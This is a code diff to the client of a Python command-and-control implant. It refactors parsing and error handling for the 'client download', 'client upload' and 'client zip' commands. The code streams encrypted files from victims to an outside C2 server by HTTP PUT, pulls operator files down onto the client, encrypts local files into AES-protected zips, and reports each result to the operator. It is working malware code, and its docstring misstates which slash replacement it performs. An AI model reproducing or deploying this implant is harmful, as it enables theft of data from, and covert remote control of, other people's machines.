@@ -57,6 +57,19 @@ def post_to_server(message: str, response_path=RESPONSE):
     except exceptions.RequestException:
         return
 
+"""this is a function that split string and returns third item.
+by default, all forwarded slashes in the third item Changed to backslashes
+this can be disabled, if replace set on False during call function. """
+def get_third_item(input_string, replace=True):
+    try:
+        if replace:
+            return input_string.split()[2].replace("\\", "/")
+        else:
+            return input_string.split()[2]
+    # If the path of the file doesn't enter correctly, notify us on the server
+    except IndexError:
+        post_to_server(f"You must enter Argument after {input_string}. \n")
+
 
 # Better use infinity loop when add control active sessions feature in Server Side
 while True:
@@ -124,20 +137,21 @@ while True:
     # The client download FILENAME command allows us to transfer a file to the client from our C2 Server,
     # Actually Client download from our C2 server, in below elif block Handle the download command
     elif command.startswith("client download"):
-        # Initialize filename to get rid of annoying Pycharm Warning
-        filename = None
+        # Split out the filepath to download, and replace \ with /
+        filepath = get_third_item(command)
 
+        # If we got IndexError, start a new iteration of the wile loop
+        if filepath is None:
+            continue
+
+        # Return the basename(filename) from filepath
+        filename = path.basename(filepath)
+
+        # UTF-8 Encode the file to be able to be encrypting it, but then we must decode it after the encryption.
+        encryptedFilepath = cipher.encrypt(filepath.encode()).decode()
+
+        # Use and HTTP GET request to stream the requested file from c2 server
         try:
-            # Split out the filepath to download, after split 0-client & 1-download & 2-path, so we need index 2
-            filepath = command.split()[2]
-
-            # Split out the filename from the end of file path, or if only a file name was supplied, use it.
-            filename = filepath.replace("\\", "/").rsplit("/", 1)[-1]
-
-            # UTF-8 Encode the file to be able to be encrypting it, but then we must decode it after the encryption.
-            encryptedFilepath = cipher.encrypt(filepath.encode()).decode()
-
-            # Use and HTTP GET request to stream the requested file from c2 server
             with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encryptedFilepath}", stream=True,
                      headers=HEADERS, proxies=PROXY) as response:
 
@@ -151,57 +165,61 @@ while True:
                     # Notify us on the server that the file was downloaded
                     post_to_server(f"{filename} is now on {client}.\n")
 
-        # If the path of the file doesn't enter correctly, notify us on the server
-        except IndexError:
-            post_to_server(f"You must enter the File Name to be downloaded on the client")
-
         # Exception Handling Common Errors maybe occurs
-        except (FileNotFoundError, PermissionError, OSError):
-            post_to_server(f"Unable to write {filename} to disk on the {client}.\n")
+        except FileNotFoundError:
+            # noinspection PyUnboundLocalVariable
+            post_to_server(f"{filepath} is not found on the {client}.\n")
+        except PermissionError:
+            post_to_server(f"You don't have permission to download {filepath} on the {client}.\n")
+        except OSError:
+            post_to_server(f"Unable to Access {filepath} on the {client}, Operation System Error.\n")
 
 
     # The client upload FILENAME command allows us to transfer a file to the c2 server from our connected client,
     # Actually Client can Upload a file to server
     elif command.startswith("client upload"):
 
-        # Initialize filename to get rid of annoying Pycharm Warning
-        filename = None
-        filepath = None
+        # Split out the filepath to download, and replace \ with /
+        filepath = get_third_item(command)
 
+        # If we got IndexError, start a new iteration of the wile loop
+        if filepath is None:
+            continue
+
+        # Return the basename(filename) from filepath
+        filename = path.basename(filepath)
+
+        # UTF-8 Encode the file to be able to be encrypting it, but then we must decode it after the encryption.
+        encryptedFilename = cipher.encrypt(filename.encode()).decode()
+
+        # Read the file and use it as data argument for an HTTP PUT Request to our C2 Server
         try:
-            # Split out the filepath to download, after split 0-client & 1-download & 2-path, so we need index 2
-            filepath = command.split()[2]
-
-            # Split out the filename from the end of file path, or if only a file name was supplied, use it.
-            filename = filepath.replace("\\", "/").rsplit("/", 1)[-1]
-
-            # UTF-8 Encode the file to be able to be encrypting it, but then we must decode it after the encryption.
-            encryptedFilename = cipher.encrypt(filename.encode()).decode()
-
-            # Read the file and use it as data argument for an HTTP PUT Request to our C2 Server
             with open(filepath, "rb") as fileHandle:
                 encryptedFile = cipher.encrypt(fileHandle.read())
                 put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encryptedFilename}", data=encryptedFile, stream=True,
                     headers=HEADERS, proxies=PROXY)
 
-        # If the path of the file doesn't enter correctly, notify us on the server
-        except IndexError:
-            post_to_server(f"You must enter the File Name to be downloaded on the client")
-
         # Exception Handling Common Errors maybe occurs
-        except (FileNotFoundError, PermissionError, OSError) as e:
-            print(e)
-            post_to_server(f"Unable to write {filename} to disk on the {client}.\n")
+        except FileNotFoundError:
+            post_to_server(f"{filepath} is not found on the {client}.\n")
+        except PermissionError:
+            post_to_server(f"You don't have permission to Upload {filepath} from the {client}.\n")
+        except OSError:
+            post_to_server(f"Unable to Access {filepath} on the {client}, Operation System Error.\n")
 
     elif command.startswith("client zip"):
-        # Initialize filepath to get rid of annoying Pycharm Warning
-        filepath = None
+        # Split out the filepath to download, and replace \ with /
+        filepath = get_third_item(command)
 
+        # If we got IndexError, start a new iteration of the wile loop
+        if filepath is None:
+            continue
+
+        # Return the basename(filename) from filepath
+        filename = path.basename(filepath)
+
+        # ZIP file using AES Encryption and LZMA compression method
         try:
-            # Split out the filepath from command
-            filepath = command.split()[2]
-
-            # ZIP file using AES Encryption and LZMA compression method
             with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zipFile:
                 zipFile.setpassword(ZIP_PASSWORD)
 
@@ -209,10 +227,9 @@ while True:
                 if path.isdir(filepath):
                     post_to_server(f"{filepath} on {client} is a directory. only Files can be zip-encrypted. \n")
                 else:
-                    zipFile.write(filepath)
+                    zipFile.write(filepath, arcname=filename)
                     post_to_server(f"{filepath} is now zip-encrypted on the {client}. \n")
-        except IndexError:
-            post_to_server("You must enter File Path to be zip-encrypted. \n")
+
         except FileNotFoundError:
             post_to_server(f"{filepath} is not found on the {client}.\n")
         except PermissionError:
